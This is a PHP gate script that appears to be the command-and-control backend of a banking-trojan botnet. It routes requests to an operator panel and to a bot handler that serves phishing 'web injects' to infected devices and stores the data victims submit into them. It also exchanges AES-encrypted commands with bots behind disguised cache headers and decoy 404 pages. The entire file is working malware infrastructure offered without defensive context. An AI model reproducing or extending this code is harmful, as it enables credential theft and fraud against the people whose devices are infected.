<?php
require_once "hlp.php";
if(!defined('MODE')) hlp::show_404();

require_once "core_module.php";

if(MODE == 'panel'){ #show admin panel
	
	require_once "panel.php";
	$panel = new Panel();
	
	if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest')
		die($panel->process_ajax($_POST));	// all other things
	else
		die($panel->process_request($_REQUEST));	// login and main page html and download

}else if(MODE == 'stat'){ # show guest stats
	
	require_once "panel.php";
	$panel = new Panel();
	die($panel->show_guest_stats());

}else if(MODE == 'bot'){ # process requests from a bot

	require_once "bot.php";
	$bot = new Bot();
	
	// ============================== WEB INJECTS BLOCK
	
	// Custom header ETage from bot webview
	if(!empty($_SERVER['HTTP_ETAGE']) && !empty($_SERVER['HTTP_X_CACHE']) ||  // show inject
		!empty($_GET['bs']) ||	// manual test in browser
		!empty($_POST['bot_id']) && !empty($_POST['page_id']) // save inject post data
	){
		$debug = false; // enable if bs parameter is present
		$language = "";
		
		// request from webview to show inject
		if(!empty($_SERVER['HTTP_ETAGE']) && !empty($_SERVER['HTTP_X_CACHE']) && !empty($_SERVER['HTTP_X_CACHED']))
		{
			$bot_id = $_SERVER['HTTP_ETAGE'];
			$inject_id = (int) $_SERVER['HTTP_X_CACHE'];
			$language = $_SERVER['HTTP_X_CACHED'];
			
		// show for manual test
		}else if(isset($_GET['bs']) && strstr($_GET['bs'], ":"))
		{
			list($bot_id, $inject_id) = explode(":", $_GET['bs'], 2);
			$inject_id = (int) $inject_id;
			$debug = true;
		// save inject data
		}else if(!empty($_POST['bot_id']) && !empty($_POST['page_id'])){
			$inject_id = (int) $_POST['page_id'];
			$bot_id = $_POST['bot_id'];
		}else
			hlp::show_404();
			
		if(!preg_match("/[a-zA-Z0-9]{32}/", $bot_id))
			hlp::show_404();
			
		// Show inject or Save inject to db
		die($bot->process_inject($bot_id, $inject_id, $_REQUEST, $debug, $language));
	}
	
	if(!empty($_GET['res']) && !empty($_GET['p'])) // p - package name folder,
		die($bot->process_inject(null, null, $_REQUEST)); // get resource
	
	
	// ======================= BOT BLOCK 

	
	$SPECIAL_HEADER = 'not-cache';
	
	// Send custom header: Cache-Control: not-cache
	if(empty($_SERVER['HTTP_CACHE_CONTROL']) || $_SERVER['HTTP_CACHE_CONTROL'] != $SPECIAL_HEADER)
		hlp::show_404();
	
	$raw = file_get_contents("php://input");

	if(function_exists("gzdecode"))
		$aes = @gzdecode($raw);
	else
		$aes = @gzinflate(substr($raw, 10, -8));

	if(!$aes || !trim($aes)) 
		hlp::show_404();

	// AES $raw -> $json
	
	$json = hlp::aes_decrypt($aes, md5($SPECIAL_HEADER));

	// DEBUG AES
	//~ file_put_contents('/var/www/tmp/aes/' . time() . '.bin', $aes . print_r($json, true));

	$data = json_decode($json, true);
	//~ $data = json_decode($aes, true);
	if($data === false)
		hlp::show_404();

	// process json bot command
	$json = $bot->process_request($data);
	// json -> aes
	$aes = hlp::aes_encrypt($json, md5($SPECIAL_HEADER));
	die($aes);
	//~ die($json);

}else
	hlp::show_404();
